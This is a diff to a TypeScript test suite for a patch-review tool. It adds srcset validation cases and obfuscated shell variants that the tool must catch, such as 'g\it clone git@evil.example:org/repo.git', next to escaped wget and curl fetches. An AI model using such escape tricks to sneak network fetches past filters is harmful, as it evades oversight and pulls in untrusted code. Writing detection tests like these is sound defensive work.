@@ -768,6 +768,42 @@ describe("patch approval and recovery", () => {
 });
 
 describe("review regressions", () => {
+  it.each([
+    '<img srcset="missing.png">',
+    '<img srcset="small.png 1x, large.png 2x">',
+    'image.srcset = "missing.png"',
+    '{ "srcset": "missing.png" }',
+  ])(
+    "requires manual validation for srcset code examples: %s",
+    async (command) => {
+      const { root, run } = await fixture();
+      await propose(root, run, policy, {
+        findings: [
+          finding(run, {
+            kind: "command",
+            original: "old-command",
+            replacement: command,
+          }),
+        ],
+      });
+      await expect(createPatches(root, run, policy)).rejects.toThrow(
+        "srcset code examples require manual validation",
+      );
+    },
+  );
+  it("requires manual validation for inline srcset examples", async () => {
+    const { root, run } = await fixture();
+    await propose(root, run, policy, {
+      findings: [
+        finding(run, {
+          replacement: 'Example: `<img srcset="missing.png">`.',
+        }),
+      ],
+    });
+    await expect(createPatches(root, run, policy)).rejects.toThrow(
+      "srcset code examples require manual validation",
+    );
+  });
   it.each(["expired", "retry", "late", "success"])(
     "enforces the persisted discovery-search deadline: %s",
     async (outcome) => {
@@ -904,6 +940,9 @@ describe("review regressions", () => {
     '$"wget" docs.example.com/guide',
     "c{ur,x}l docs.example.com/guide",
     "git clone git@evil.example:org/repo.git",
+    String.raw`g\it clone git@evil.example:org/repo.git`,
+    String.raw`\git clone git@evil.example:org/repo.git`,
+    String.raw`/usr/bin/g\it clone git@evil.example:org/repo.git`,
     "git clone evil.example:org/repo.git",
     "git fetch git@server:org/repo.git",
     "git remote add upstream git@evil.example:org/repo.git",
